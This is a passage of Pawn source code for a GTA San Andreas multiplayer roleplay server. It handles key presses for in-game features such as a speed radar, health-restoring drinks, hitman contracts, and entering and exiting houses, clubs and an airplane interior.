		|| ((oldkeys & KEY_WALK && newkeys & KEY_UP) || (oldkeys & KEY_WALK && newkeys & KEY_DOWN) || (oldkeys & KEY_WALK && newkeys & KEY_LEFT) || (oldkeys & KEY_WALK && newkeys & KEY_RIGHT))
		|| ((newkeys & KEY_WALK && oldkeys & KEY_UP) || (newkeys & KEY_WALK && oldkeys & KEY_DOWN) || (newkeys & KEY_WALK && oldkeys & KEY_LEFT) || (newkeys & KEY_WALK && oldkeys & KEY_RIGHT))
		&& GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
	}
	if((newkeys & KEY_FIRE) && GetPVarInt(playerid, "SpeedRadar") == 1 && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
	    if(GetPVarInt(playerid, "RadarTimeout") == 0)
	    {
			if(GetPlayerWeapon(playerid) == 43)
			{
			    new Float:x,Float:y,Float:z;
				foreach(Player, i)
				{
				    if(IsPlayerStreamedIn(i, playerid))
				    {
					    GetPlayerPos(i,x,y,z);
					    if(IsPlayerAimingAt(playerid,x,y,z,10))
					    {
							new string[68];
							format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~b~License Plate: ~w~%d~n~~b~Speed: ~w~%.0f MPH", GetPlayerVehicleID(i), fVehSpeed[i]);
							GameTextForPlayer(playerid, string,3500, 3);
							format(string, sizeof(string), "License Plate: %d. Speed: %.0f MPH", GetPlayerVehicleID(i), fVehSpeed[i]);
							SendClientMessage(playerid, COLOR_GRAD4, string);
							SetPVarInt(playerid, "RadarTimeout", 1);
							SetTimerEx("RadarCooldown", 3000, 0, "i", playerid);
							return 1;
						}
					}
			    }
			}
		}
	}
	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DRINK_BEER && (newkeys & KEY_FIRE))
	{
	    if(GetPVarInt(playerid, "DrinkCooledDown") == 1)
	    {
			new Float: cHealth;
			GetPlayerHealth(playerid, cHealth);
		    if((cHealth + 5) >= 100) {
				SetPlayerHealth(playerid, 100);
		        SendClientMessage(playerid, COLOR_GREY, "* You finish up the drink and throw it away.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    }
		    else if(cHealth <= 95) {
                SetPlayerHealth(playerid, cHealth+5);
			}
		    else {
		        SendClientMessage(playerid, COLOR_GREY, "* You finish up the drink and throw it away.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    }
			DeletePVar(playerid, "DrinkCooledDown");
		    SetTimerEx("DrinkCooldown", 2500, 0, "i", playerid);
			return 1;
		}
	}
	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DRINK_WINE && (newkeys & KEY_FIRE))
	{
	    if(GetPVarInt(playerid, "DrinkCooledDown") == 1)
	    {
			new Float: cHealth;
			GetPlayerHealth(playerid, cHealth);
		    if((cHealth + 8) >= 100) {
				SetPlayerHealth(playerid, 100);
		        SendClientMessage(playerid, COLOR_GREY, "* You finish up the drink and throw it away.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    } else if(cHealth <= 92) {
				SetPlayerHealth(playerid, cHealth+8);
		    } else {
		        SendClientMessage(playerid, COLOR_GREY, "* You finish up the drink and throw it away.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    }
			DeletePVar(playerid, "DrinkCooledDown");
		    SetTimerEx("DrinkCooldown", 2500, 0, "i", playerid);
			return 1;
		}
	}

	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DRINK_SPRUNK && (newkeys & KEY_FIRE))
	{
	    if(GetPVarInt(playerid, "DrinkCooledDown") == 1)
	    {
			new Float: cHealth;
			GetPlayerHealth(playerid, cHealth);
			if((cHealth + 2) >= 100) {
				SetPlayerHealth(playerid, 100);
		        SendClientMessage(playerid, COLOR_GREY, "* You finish up the drink and throw it away.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    } else if(cHealth <= 98) {
				SetPlayerHealth(playerid, cHealth+2);
		    } else {
		        SendClientMessage(playerid, COLOR_GREY, "* You finish up the drink and throw it away.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    }
		    DeletePVar(playerid, "DrinkCooledDown");
		    SetTimerEx("DrinkCooldown", 2500, 0, "i", playerid);
			return 1;
		}
	}
	if(IsKeyJustDown(KEY_SECONDARY_ATTACK, newkeys, oldkeys))
	{
		if(GetPVarInt(playerid, "UsingSprunk"))
		{
			DeletePVar(playerid, "UsingSprunk");
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
			return 1;
		}
	}
	if(IsKeyJustDown(KEY_FIRE, newkeys, oldkeys))
 	{
  		if(PlayerInfo[playerid][pC4Used] == 1)
 	    {
			if(GoChase[playerid] < 999)
			{
			    if(IsPlayerInRangeOfPoint(GoChase[playerid], 12.0, GetPVarFloat(playerid, "DYN_C4_FLOAT_X"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Y"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Z")))
			    {
			        if(PlayerInfo[GoChase[playerid]][pHeadValue] >= 1)
					{
						if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
						{
							new
								string[128],
								name2[MAX_PLAYER_NAME],
								name[MAX_PLAYER_NAME];

							new takemoney = PlayerInfo[GoChase[playerid]][pHeadValue] / 4 * 2;
							name = GetPlayerNameEx(GoChase[playerid]);
							GivePlayerCash(playerid, takemoney);
							GivePlayerCash(GoChase[playerid], -takemoney);
							format(string,sizeof(string),"Hitman %s has fulfilled the contract on %s and collected $%d",GetPlayerNameEx(playerid),GetPlayerNameEx(GoChase[playerid]),PlayerInfo[GoChase[playerid]][pHeadValue] / 4 * 2);
							SendFamilyMessage(4, COLOR_YELLOW, string);
							format(string,sizeof(string),"You have been critically injured by a Hitman and lost $%d!",takemoney);
							ResetPlayerWeaponsEx(GoChase[playerid]);
						    // SpawnPlayer(GoChase[playerid]);
							SendClientMessage(GoChase[playerid], COLOR_YELLOW, string);

							foreach(Player, i) {
				    			name2 = GetPlayerNameEx(i);
			    				if(!strcmp(PlayerInfo[GoChase[playerid]][pContractBy], name2, true)) {
    								if(!IsPlayerStreamedIn(i, GoChase[playerid])) {
     									format(string, sizeof(string), "SMS: The deed (on %s) has been done, Sender: MOLE (555)", name);
										SendClientMessage(i, COLOR_YELLOW, string);
									}
				    			}
							}

							PlayerInfo[GoChase[playerid]][pHeadValue] = 0;
							strcpy(PlayerInfo[GoChase[playerid]][pContractBy], "Nobody", 64);
							strcpy(PlayerInfo[GoChase[playerid]][pContractDetail], "None", 64);
							PlayerInfo[playerid][pCHits] += 1;
							SetPlayerHealth(GoChase[playerid], 0.0);
							// KillEMSQueue(GoChase[playerid]);
							GotHit[GoChase[playerid]] = 0;
							GetChased[GoChase[playerid]] = 999;
							GoChase[playerid] = 999;
						}
					}
			    }
			}
 	        PlayerInfo[playerid][pC4Used] = 0;
			CreateExplosion(GetPVarFloat(playerid, "DYN_C4_FLOAT_X"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Y"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Z"), 7, 8);
			PickUpC4(playerid);
			SendClientMessage(playerid, COLOR_YELLOW, "Bomb has been detonated!");
			PlayerInfo[playerid][pC4Used] = 0;
			return 1;
 	    }
 	    if(GetPVarInt(playerid, "MovingStretcher") != -1)
 	    {
 	        KillTimer(GetPVarInt(playerid, "TickEMSMove"));
		    MoveEMS(playerid);
			return 1;
 	    }
		if(GetPVarInt(playerid, "editingcdvehpos"))
		{
			TogglePlayerControllable(playerid, false);
		    ShowPlayerDialogEx(playerid,DIALOG_CDEDITPARK,DIALOG_STYLE_MSGBOX,"Warning:","Is this the new position you want?","Ok","Cancel");
		}
		if(GetPVarInt(playerid, "editingcdvehnew"))
		{
            TogglePlayerControllable(playerid, false);
	        ShowPlayerDialogEx(playerid,DIALOG_CDEDITPARK,DIALOG_STYLE_MSGBOX,"Warning:","Is this the new position you want?","Ok","Cancel");
		}

		new Float:health;
 		GetPlayerHealth(playerid, health);
		if(GetPVarInt(playerid, "UsingSprunk"))
		{
		    new hpint = floatround(health, floatround_round);
		    if(hpint >= 100)
			{
  				SendClientMessage(playerid, COLOR_GREY, " You already have full health.");
	 			return 1;
	   		}
	   		else
	   		{
				GetPlayerHealth(playerid, health);
				SetPlayerHealth(playerid, health+1.0);
			}
		}
	}
    if(IsKeyJustDown(KEY_YES, newkeys, oldkeys)) {
        if(GetPVarInt(playerid, "PBM") > 0) {
            SendClientMessage(playerid, COLOR_WHITE, "You can't do this while being in a arena!");
            return 1;
        }
        if(PlayerCuffed[playerid] >= 1) {
            SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");
            return 1;
        }
        if(PlayerInfo[playerid][pJailed] > 0) {
            SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");
            return 1;
        }

        new
			string[128];

        for(new i = 0; i < sizeof(DDoorsInfo); i++) {
            if(IsPlayerInRangeOfPoint(playerid,3.0,DDoorsInfo[i][ddExteriorX], DDoorsInfo[i][ddExteriorY], DDoorsInfo[i][ddExteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddExteriorVW]) {
                if(DDoorsInfo[i][ddVIP] > 0 && PlayerInfo[playerid][pVip] < DDoorsInfo[i][ddVIP])
                    return SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, you're not a high enough VIP level.");


                if(DDoorsInfo[i][ddGang] > 0 && PlayerInfo[playerid][pGang] != DDoorsInfo[i][ddGang])
                	return SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, this door is gang restricted.");

                if(DDoorsInfo[i][ddFaction] > 0 && DDoorsInfo[i][ddFaction] != 1337) {
					if(PlayerInfo[playerid][pFaction] != DDoorsInfo[i][ddFaction])
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, this door is faction restricted.");
						return 1;
					}
				}

				if(DDoorsInfo[i][ddFaction] == 1337) {
					if(!IsACop(playerid) || PlayerInfo[playerid][pFaction] != 5)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, this door is faction restricted.");
						return 1;
					}
				}

                if(DDoorsInfo[i][ddAdmin] > 0 && PlayerInfo[playerid][pAdmin] < DDoorsInfo[i][ddAdmin])
                    return SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, you're not a high enough admin level.");

                if(DDoorsInfo[i][ddWanted] > 0 && PlayerInfo[playerid][pWantedLevel] != 0)
                    return SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, this door restricts those with wanted levels.");

                if(DDoorsInfo[i][ddLocked] == 1)
                    return SendClientMessage(playerid, COLOR_GRAD2, "This door is currently locked.");

                format(string, sizeof(string), "* %s has entered %s.", GetPlayerNameEx(playerid), DDoorsInfo[i][ddDescription]);
                ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

                SetPlayerInterior(playerid,DDoorsInfo[i][ddInteriorInt]);
                PlayerInfo[playerid][pInt] = DDoorsInfo[i][ddInteriorInt];
                PlayerInfo[playerid][pVW] = DDoorsInfo[i][ddInteriorVW];
                SetPlayerVirtualWorld(playerid, DDoorsInfo[i][ddInteriorVW]);
                if(DDoorsInfo[i][ddCustomInterior]) {
                    LoadObjectsForPlayer(playerid);
                }
                if(DDoorsInfo[i][ddVehicleAble] > 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
                    SetVehiclePos(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
                    SetVehicleZAngle(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorA]);
                    SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorVW]);
                    LinkVehicleToInterior(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorInt]);
                }
                else {
                    SetPlayerPos(playerid,DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
                    SetPlayerFacingAngle(playerid,DDoorsInfo[i][ddInteriorA]);
                    SetCameraBehindPlayer(playerid);
                }
				foreach(Player, x)
				{
                	if(IsABoomboxNearby(DDoorsInfo[i][ddInteriorX] ,DDoorsInfo[i][ddInteriorY], DDoorsInfo[i][ddInteriorZ], x) < 150.0 && DDoorsInfo[i][ddInteriorVW] == BoomboxInfo[x][bbVW] && DDoorsInfo[i][ddInteriorInt] == BoomboxInfo[x][bbInt])
					{
						PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
					}
				}
                return Streamer_UpdateEx(playerid, DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
            }
        }
        for(new i = 0; i < sizeof(HouseInfo); i++) {
            if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ])) {
                if(HouseKey[playerid] == i || PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i || HouseInfo[i][hLock] == 0 || PlayerInfo[playerid][pRenting] == i || strcmp(HouseInfo[i][hOwner], PlayerInfo[playerid][pMarriedTo],true) == 0) {
                    if(PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i) {
                        format(string, sizeof(string), "* %s has entered their house.", GetPlayerNameEx(playerid));
                        ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                    }
                    else {
                        if(HouseInfo[i][hOwned] == 0) {
							format(string, sizeof(string), "* %s has entered a house.", GetPlayerNameEx(playerid));
							ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						} else {
							format(string, sizeof(string), "* %s has entered %s's house.", GetPlayerNameEx(playerid), HouseInfo[i][hOwner]);
							ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						}
                    }

                    SetPlayerInterior(playerid,HouseInfo[i][hHInteriorWorld]);
                    PlayerInfo[playerid][pInt] = HouseInfo[i][hHInteriorWorld];
                    PlayerInfo[playerid][pVW] = i+60000;
                    SetPlayerVirtualWorld(playerid, i+60000);
                    if(HouseInfo[i][hCustomInterior] == 1) {
                        LoadObjectsForPlayer(playerid);
                    }
                    SetPlayerPos(playerid,HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
                    SetPlayerFacingAngle(playerid,HouseInfo[i][hInteriorA]);
                    SetCameraBehindPlayer(playerid);
                    if(PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i) {
                        GameTextForPlayer(playerid, "~w~Welcome Home", 5000, 1);
                    }
					foreach(Player, x)
					{
                		if(IsABoomboxNearby(HouseInfo[i][hInteriorX], HouseInfo[i][hInteriorY], HouseInfo[i][hInteriorZ], x) < 150.0 && i+60000 == BoomboxInfo[x][bbVW] && HouseInfo[i][hHInteriorWorld] == BoomboxInfo[x][bbInt])
						{
							PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
						}
					}
                    Streamer_UpdateEx(playerid, HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
                }
                else {
                    GameTextForPlayer(playerid, "~r~Locked", 5000, 1);
                }
                return 1;
            }
        }

		// Hitman HQ
        if(IsPlayerInRangeOfPoint(playerid, 2.0,  -418.68, 1759.65, 6.22)) {
            if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4) {
                SetPlayerVirtualWorld(playerid, 666420);
                PlayerInfo[playerid][pVW] = 666420;
                SetPlayerInterior(playerid, 42);
                PlayerInfo[playerid][pInt] = 42;
                SetPlayerPos(playerid, 1277.019165, -758.428771, 5080.750000);
                SetPlayerFacingAngle(playerid, 358.16);
                SetCameraBehindPlayer(playerid);

                LoadObjectsForPlayer(playerid);
                SendClientMessage(playerid, COLOR_WHITE, "You can /order weaponry in the armory room.");
                return 1;
            }
        }

		// The Lubu Gentlemen's Club
        else if(IsPlayerInRangeOfPoint(playerid, 3.0,  511.817230, -1510.971679, 14.566996)) {
            format(string, sizeof(string), "* %s has entered The Lubu Gentlemen's Club.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 373737);
            PlayerInfo[playerid][pVW] = 373737;
            SetPlayerInterior(playerid, 37);
            PlayerInfo[playerid][pInt] = 37;
            SetPlayerPos(playerid, -1077.946533, 613.206665, 1116.507812);
            SetPlayerFacingAngle(playerid, 92.42);
            SetCameraBehindPlayer(playerid);

            LoadObjectsForPlayer(playerid);

            PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=242774", -1087.677978, 615.239807, 1116.507812, 40.0, 1);
            return 1;
        }

		// The Tableau Club
        else if(IsPlayerInRangeOfPoint(playerid, 3.0,  1798.08,-1578.68,14.09)) {
            format(string, sizeof(string), "* %s has entered The VIP Club.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 363636);
            PlayerInfo[playerid][pVW] = 363636;
            SetPlayerInterior(playerid, 36);
            PlayerInfo[playerid][pInt] = 36;
            SetPlayerPos(playerid, 2580.1853,1417.4607,7701.9907);
            // SetPlayerPos(playerid, 308.045654, 1053.886840, 1098.540039);
            SetPlayerFacingAngle(playerid, 93.0);
            SetCameraBehindPlayer(playerid);

            LoadObjectsForPlayer(playerid);

            PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377200", 321.139465, 1034.947753, 1098.914062, 120.0, 1);
            return 1;
        }

		// The VIP club (VIP ROOM)
        else if(IsPlayerInRangeOfPoint(playerid, 3.0,  0,0,0)) { // To be done Second VIP... idk cords?
            if(GetPlayerCash(playerid) >= 100) {
                format(string, sizeof(string), "* %s has entered The VIP Lounge.", GetPlayerNameEx(playerid));
                ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

                GivePlayerCash(playerid, -100);
                GameTextForPlayer(playerid, "~r~-$100", 3000, 1);

                SetPlayerVirtualWorld(playerid, 363636);
                PlayerInfo[playerid][pVW] = 363636;
                SetPlayerInterior(playerid, 36);
                PlayerInfo[playerid][pInt] = 36;
                SetPlayerPos(playerid, 293.066436, 1029.785278, 1104.560058);
                SetPlayerFacingAngle(playerid, 352.47);
                SetCameraBehindPlayer(playerid);
                return 1;
            }
            else return SendClientMessage(playerid, COLOR_GREY, " You do not have the cash for that.");
        }

		// Santa Maria Surfer's Lounge
        else if(IsPlayerInRangeOfPoint(playerid, 3.0,  387.958374, -1870.688110, 7.835937)) {
            format(string, sizeof(string), "* %s has entered Santa Maria Surfer's Lounge.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 353535);
            PlayerInfo[playerid][pVW] = 353535;
            SetPlayerInterior(playerid, 35);
            PlayerInfo[playerid][pInt] = 35;
            SetPlayerPos(playerid, 271.742034, 1074.419677, 5096.750000);
            SetPlayerFacingAngle(playerid, 86.54);
            SetCameraBehindPlayer(playerid);

            LoadObjectsForPlayer(playerid);

            PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=21585", 271.742034, 1074.419677, 5096.750000, 120.0, 1);
            return 1;
        }

        new vehicleid = GetPlayerVehicleID(playerid);
        new closestcar = GetClosestCar(playerid, vehicleid);
        if(IsPlayerInRangeOfVehicle(playerid, closestcar, 6.0) && GetVehicleModel(closestcar) == 519) {
            if(VehicleStatus{closestcar}
            == 1) return SendClientMessage(playerid, COLOR_WHITE, "You're not allowed to enter this Shamal as it's been damaged!");
            format(string, sizeof(string), "* %s enters the Shamal airplane as a passenger.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            SetPlayerPos(playerid, 2.509036, 23.118730, 1199.593750);
            SetPlayerFacingAngle(playerid, 82.14);
            SetCameraBehindPlayer(playerid);
            PlayerInfo[playerid][pVW] = closestcar;
            SetPlayerVirtualWorld(playerid, closestcar);
            PlayerInfo[playerid][pInt] = 1;
            SetPlayerInterior(playerid, 1);
            InsideShamal[playerid] = closestcar;
            SendClientMessage(playerid, COLOR_WHITE, "Type /exit near the door to exit the vehicle, or /window to look outside.");

      		foreach(Player, x)
			{
 				if(IsABoomboxNearby(2.509036, 23.118730, 1199.593750, x) < 150.0 && closestcar == BoomboxInfo[x][bbVW] && BoomboxInfo[x][bbInt] == 1)
				{
					PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
				}
			}
            return 1;
        }

        for(new i = 0; i <  sizeof(DDoorsInfo); i++) {
            if(IsPlayerInRangeOfPoint(playerid,3,DDoorsInfo[i][ddInteriorX], DDoorsInfo[i][ddInteriorY], DDoorsInfo[i][ddInteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddInteriorVW]) {
                format(string, sizeof(string), "* %s has exited the building.", GetPlayerNameEx(playerid));
                ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

                SetPlayerInterior(playerid,DDoorsInfo[i][ddExteriorInt]);
                PlayerInfo[playerid][pInt] = DDoorsInfo[i][ddExteriorInt];
                SetPlayerVirtualWorld(playerid, DDoorsInfo[i][ddExteriorVW]);
                PlayerInfo[playerid][pVW] = DDoorsInfo[i][ddExteriorVW];
                if(DDoorsInfo[i][ddCustomExterior]) {
                    LoadObjectsForPlayer(playerid);
                }
                if(DDoorsInfo[i][ddVehicleAble] > 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
                    SetVehiclePos(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorX],DDoorsInfo[i][ddExteriorY],DDoorsInfo[i][ddExteriorZ]);
                    SetVehicleZAngle(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorA]);
                    SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorVW]);
                    LinkVehicleToInterior(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorInt]);
                }
                else {
                    SetPlayerPos(playerid,DDoorsInfo[i][ddExteriorX],DDoorsInfo[i][ddExteriorY],DDoorsInfo[i][ddExteriorZ]);
                    SetPlayerFacingAngle(playerid, DDoorsInfo[i][ddExteriorA]);
                    SetCameraBehindPlayer(playerid);
                }
                return Streamer_UpdateEx(playerid, DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
            }
        }
        for(new i = 0; i <  sizeof(HouseInfo); i++) {
            if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hInteriorX], HouseInfo[i][hInteriorY], HouseInfo[i][hInteriorZ]) && (GetPlayerVirtualWorld(playerid) == i+60000)) {
                format(string, sizeof(string), "* %s has exited the house.", GetPlayerNameEx(playerid));
                ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                SetPlayerInterior(playerid,0);
                PlayerInfo[playerid][pInt] = 0;
                if(HouseInfo[i][hCustomExterior]) {
					LoadObjectsForPlayer(playerid);
                }
                SetPlayerPos(playerid,HouseInfo[i][hExteriorX],HouseInfo[i][hExteriorY],HouseInfo[i][hExteriorZ]);
                SetPlayerFacingAngle(playerid, HouseInfo[i][hExteriorA]);
                SetCameraBehindPlayer(playerid);
                SetPlayerVirtualWorld(playerid, 0);
                PlayerInfo[playerid][pVW] = 0;
                return Streamer_UpdateEx(playerid, HouseInfo[i][hExteriorX],HouseInfo[i][hExteriorY],HouseInfo[i][hExteriorZ]);
            }
        }

		// Hitman HQ
        if(IsPlayerInRangeOfPoint(playerid, 2.0, 1277.019165, -758.428771, 5080.750000) && (GetPlayerVirtualWorld(playerid) == 42)) {
            if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4) {
                SetPlayerVirtualWorld(playerid, 0);
                PlayerInfo[playerid][pVW] = 0;
                SetPlayerInterior(playerid, 0);
                PlayerInfo[playerid][pInt] = 0;
                SetPlayerPos(playerid, -418.68, -1759.65, 6.22);
                SetPlayerFacingAngle(playerid, 338.54);
                SetCameraBehindPlayer(playerid);
                return 1;
            }
        }

		// The Lubu Gentlemen's Club
        else if(IsPlayerInRangeOfPoint(playerid, 3.0, -1077.946533, 613.206665, 1116.507812) && (GetPlayerVirtualWorld(playerid) == 373737)) {
            format(string, sizeof(string), "* %s has exited the building.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pVW] = 0;
            SetPlayerInterior(playerid, 0);
            PlayerInfo[playerid][pInt] = 0;
            SetPlayerPos(playerid, 511.817230, -1510.971679, 14.566996);
            SetPlayerFacingAngle(playerid, 272.11);
            SetCameraBehindPlayer(playerid);

            StopAudioStreamForPlayer(playerid);
            return 1;
        }

		// The Tableau Club
        else if(IsPlayerInRangeOfPoint(playerid, 3.0, 2580.1853,1417.4607,7701.9907)) {
            format(string, sizeof(string), "* %s has exited the building.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pVW] = 0;
            SetPlayerInterior(playerid, 0);
            PlayerInfo[playerid][pInt] = 0;
            SetPlayerPos(playerid, 1798.08,-1578.68,14.09);
            // SetPlayerPos(playerid, 561.802795, -1506.722412, 14.548986);
            SetPlayerFacingAngle(playerid, 0.0);
            SetCameraBehindPlayer(playerid);

            StopAudioStreamForPlayer(playerid);
            return 1;
        }
		// The VIP Club (VIP ROOM)
        else if(IsPlayerInRangeOfPoint(playerid, 3.0, 1798.08,-1578.68,14.09) && (GetPlayerVirtualWorld(playerid) == 363636)) {
            SetPlayerVirtualWorld(playerid, 363636);
            PlayerInfo[playerid][pVW] = 363636;
            SetPlayerInterior(playerid, 36);
            PlayerInfo[playerid][pInt] = 36;
            SetPlayerPos(playerid, 307.904296, 1025.602294, 1098.540039);
            SetPlayerFacingAngle(playerid, 264.06);
            SetCameraBehindPlayer(playerid);
            return 1;
        }
		// Santa Maria Surfer's Lounge
        else if(IsPlayerInRangeOfPoint(playerid, 3.0, 271.742034, 1074.419677, 5096.750000) && (GetPlayerVirtualWorld(playerid) == 353535)) {
            format(string, sizeof(string), "* %s has exited the building.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pVW] = 0;
            SetPlayerInterior(playerid, 0);
            PlayerInfo[playerid][pInt] = 0;
            SetPlayerPos(playerid, 387.958374, -1870.688110, 7.835937);
            SetPlayerFacingAngle(playerid, 89.99);
            SetCameraBehindPlayer(playerid);

            StopAudioStreamForPlayer(playerid);
            return 1;
        }
		// Shamal
        else if(InsideShamal[playerid] != INVALID_VEHICLE_ID && IsPlayerInRangeOfPoint(playerid,3,2.509036, 23.118730, 1199.593750)) {
            format(string, sizeof(string), "* %s exits the Shamal airplane.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            if(InsideShamal[playerid] == INVALID_VEHICLE_ID || GetVehicleModel(InsideShamal[playerid]) != 519) {
                PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
                GivePlayerValidWeapon(playerid, 46, 60000);
                SetPlayerPos(playerid, 0.000000, 0.000000, 420.000000);
            }
            else {
                new Float:X, Float:Y, Float:Z;
                GetVehiclePos(InsideShamal[playerid], X, Y, Z);
                SetPlayerPos(playerid, X-4, Y-2.3, Z);

                new Float:XB, Float:YB, Float:ZB;
                GetVehiclePos(InsideShamal[playerid], XB, YB, ZB);
                if(ZB > 50.0) {
                    PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
                    GivePlayerValidWeapon(playerid, 46, 60000);
                }
            }

